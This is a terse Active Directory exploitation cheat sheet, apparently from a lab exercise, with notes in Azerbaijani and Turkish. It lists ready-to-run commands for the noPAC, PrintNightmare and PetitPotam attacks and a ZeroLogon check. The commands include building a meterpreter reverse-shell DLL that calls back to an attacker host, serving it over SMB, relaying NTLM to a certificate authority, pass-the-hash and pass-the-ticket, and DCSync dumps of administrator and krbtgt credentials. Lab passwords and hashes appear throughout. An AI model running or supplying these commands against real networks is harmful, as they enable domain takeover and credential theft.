# noPAC CVE-2021-42278 (sAMAccountName Spoofing) CVE-2021-42287 (TGT Misinterpretation)
```
nxc smb 192.168.0.239 -u nopac -p 'P@ssw0rd_OxsiuM_2026!' -M nopac

Get-ADDomainController | Select-Object Name, IPv4Address

# Check Patch Version
Get-HotFix | Where-Object {$_.HotFixID -match "KB5008380" -or $_.HotFixID -match "KB5008602"}
Qeyd: Əgər bu komanda heç bir nəticə vermirsə, deməli sistem böyük ehtimalla zəifdir (vulnerable).

# NoPac için tarama
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# NoPac'i Çalıştırmak ve Kabuk Almak
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# Yerleşik Yönetici Hesabını DCSync'e noPac Kullanma
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

# PrintNightmare (CVE-2021-1675 və CVE-2021-34527)
```
git clone https://github.com/cube0x0/CVE-2021-1675.git

# Xidmətin yoxlanılması (PowerShell):
Get-Service -Name Spooler

# RPCDUMP vasitəsilə yoxlama:
rpcdump.py @172.16.5.150 | egrep 'MS-RPRN|MS-PAR'

# Skanerlərdən istifadə: CME (CrackMapExec)
crackmapexec smb 172.16.5.150 -u 'user' -p 'pass' -M printnightmare

# Zərərli DLL yaradılması (msfvenom):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
sudo smbserver.py -smb2support -user user -password pass CompData /path/
SMB Share qurulması: Hədəf serverin bu DLL-i yükləyə bilməsi üçün lokalda anonim bir share yaradılmalıdır (məsələn, impacket-smbserver ilə).

# Msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run

# Exploitation
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

# PetitPotam (MS-EFSRPC) CVE-2021-36942
```
# Başlangıç ntlmrelayx.py
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# PetitPotam.py'yi çalıştırmak
python3 PetitPotam.py 172.16.5.225 172.16.5.5

# DC01 için Catching Base64 Kodlu Sertifika
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Gettgtpkinit.py Kullanarak TGT İstemek
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64
export KRB5CCNAME=dc01.ccache

secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
klist

crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

# Submitting a TGS Request for Ourselves Using getnthash.py
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

# Using Domain Controller NTLM Hash to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

# Requesting TGT and Performing PTT with DC01$ Machine Account
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

# Performing DCSync with Mimikatz
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

# ZeroLogon ( CVE-2020-1472 )
```
python3 zero_logon_checker.py WIN-WARZONE 192.168.0.239
```


